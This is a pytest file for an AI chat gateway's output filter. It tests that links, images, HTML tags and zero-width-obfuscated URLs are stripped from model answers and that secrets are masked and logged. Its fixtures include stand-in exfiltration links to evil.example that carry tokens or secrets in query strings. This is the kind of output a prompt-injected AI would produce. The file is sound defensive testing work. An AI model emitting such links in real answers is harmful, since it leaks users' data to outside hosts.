"""S3-03: output filter unit tests and gateway response_check integration tests."""
from app import ai, gateway, settings
from app.filters import output
from app.filters.output import OutputResult, clean_answer
from app.filters.types import FilterResult


def test_markdown_image_is_completely_replaced():
    text = "Summary: ![tracker](https://evil.example/pixel.png?leak=secret) done."
    result = clean_answer(text)
    assert result == OutputResult(
        text="Summary: link removed done.",
        links_removed=0,
        images_removed=1,
        secrets={},
    )
    assert "evil.example" not in result.text


def test_markdown_link_keeps_visible_text_and_removes_url():
    text = "Read the [deployment report](https://evil.example/exfil?token=123) for details."
    result = clean_answer(text)
    assert result == OutputResult(
        text="Read the deployment report (link removed) for details.",
        links_removed=1,
        images_removed=0,
        secrets={},
    )
    assert "evil.example" not in result.text


def test_markdown_link_with_url_as_label_removes_both():
    text = "Visit [https://evil.example/a](https://evil.example/b) now."
    result = clean_answer(text)
    assert result == OutputResult(
        text="Visit link removed now.",
        links_removed=1,
        images_removed=0,
        secrets={},
    )
    assert "http" not in result.text


def test_bare_http_and_https_urls_are_removed_keeping_sentence_punctuation():
    text = "Check http://insecure.example/path and https://secure.example/q?x=1&y=2."
    result = clean_answer(text)
    assert result == OutputResult(
        text="Check link removed and link removed.",
        links_removed=2,
        images_removed=0,
        secrets={},
    )
    assert "example" not in result.text


def test_protocol_relative_www_and_parenthesized_urls_are_removed():
    text = (
        "Links: //evil.example/leak, www.evil.example/path, "
        "https://evil.example/Foo_(bar) and (see https://evil.example/in_parens)."
    )
    result = clean_answer(text)
    assert result == OutputResult(
        text="Links: link removed, link removed, link removed and (see link removed).",
        links_removed=4,
        images_removed=0,
        secrets={},
    )
    assert "evil.example" not in result.text
    assert "Foo" not in result.text


def test_html_img_and_anchor_tags_are_removed():
    text = 'Here: <img src="https://evil.example/x.png" alt="x"> and <a href="https://evil.example">click</a>.'
    result = clean_answer(text)
    assert result == OutputResult(
        text="Here: link removed and link removed.",
        links_removed=1,
        images_removed=1,
        secrets={},
    )
    assert "evil.example" not in result.text
    assert "<img" not in result.text
    assert "<a" not in result.text


def test_invisible_characters_inside_urls_are_normalized_before_filtering():
    text = "Hidden link: ht\u200btps://evil.example/\u200fsteal"
    result = clean_answer(text)
    assert result.text == "Hidden link: link removed"
    assert result.links_removed == 1


def test_plain_text_emails_channels_and_placeholders_stay_untouched():
    text = "Contact ali@example.com in #dev with PERSON_1 and EMAIL_1 or [REDACTED]."
    result = clean_answer(text)
    assert result == OutputResult(text=text, links_removed=0, images_removed=0, secrets={})


def test_second_secret_scan_delegates_to_mask_secrets(monkeypatch):
    def fake_mask_secrets(val: str) -> FilterResult:
        return FilterResult(
            text=val.replace("SECRET_VALUE", "[REDACTED]"),
            counts={"slack_token": 1},
            alarm=True,
        )

    monkeypatch.setattr(output, "mask_secrets", fake_mask_secrets)
    result = clean_answer("See https://evil.example and SECRET_VALUE")
    assert result == OutputResult(
        text="See link removed and [REDACTED]",
        links_removed=1,
        images_removed=0,
        secrets={"slack_token": 1},
    )


def test_gateway_response_check_removes_links_and_records_blocked_count(client_as, monkeypatch):
    leaked_answer = (
        "Summary of #dev for ali@example.com: "
        "![spy](https://evil.example/img.png) "
        "see [docs](https://evil.example/doc) and https://evil.example/raw."
    )
    monkeypatch.setattr(ai, "FAKE_FIXED_ANSWER", leaked_answer)
    monkeypatch.setattr(settings, "AI_PROVIDER", "fake")

    ali_client = client_as("ali")
    response = ali_client.post("/api/ask", json={"question": "#dev'i özetle"})
    assert response.status_code == 200
    body = response.json()

    assert "evil.example" not in body["answer"]
    assert "https://" not in body["answer"]
    assert "ali@example.com" in body["answer"]
    assert "#dev" in body["answer"]
    assert "docs (link removed)" in body["answer"]
    assert body["security"]["blocked"] == 3

    admin_client = client_as("admin")
    events_resp = admin_client.get("/api/admin/events")
    assert events_resp.status_code == 200
    req_events = [
        e for e in events_resp.json()["events"]
        if e["request_id"] == body["request_id"] and e["step"] == "response_check"
    ]
    assert len(req_events) == 1
    assert req_events[0]["decision"] == "passed"
    assert req_events[0]["blocked_count"] == 3
    assert gateway.NO_ACCESS_ANSWER not in body["answer"]


def test_gateway_response_check_secret_in_answer_updates_event_only(client_as, monkeypatch):
    def fake_mask_secrets(val: str) -> FilterResult:
        return FilterResult(
            text=val.replace("SECRET_IN_ANSWER", "[REDACTED]"),
            counts={"slack_token": 1},
            alarm=True,
        )

    monkeypatch.setattr(output, "mask_secrets", fake_mask_secrets)
    monkeypatch.setattr(ai, "FAKE_FIXED_ANSWER", "Summary with SECRET_IN_ANSWER inside.")
    monkeypatch.setattr(settings, "AI_PROVIDER", "fake")

    ali_client = client_as("ali")
    response = ali_client.post("/api/ask", json={"question": "#dev'i özetle"})
    assert response.status_code == 200
    body = response.json()

    assert "SECRET_IN_ANSWER" not in body["answer"]
    assert "[REDACTED]" in body["answer"]
    assert body["security"]["masked"] == 0

    admin_client = client_as("admin")
    events_resp = admin_client.get("/api/admin/events")
    assert events_resp.status_code == 200
    req_events = [
        e for e in events_resp.json()["events"]
        if e["request_id"] == body["request_id"] and e["step"] == "response_check"
    ]
    assert len(req_events) == 1
    assert req_events[0]["masked_count"] == 1
    assert req_events[0]["blocked_count"] == 0
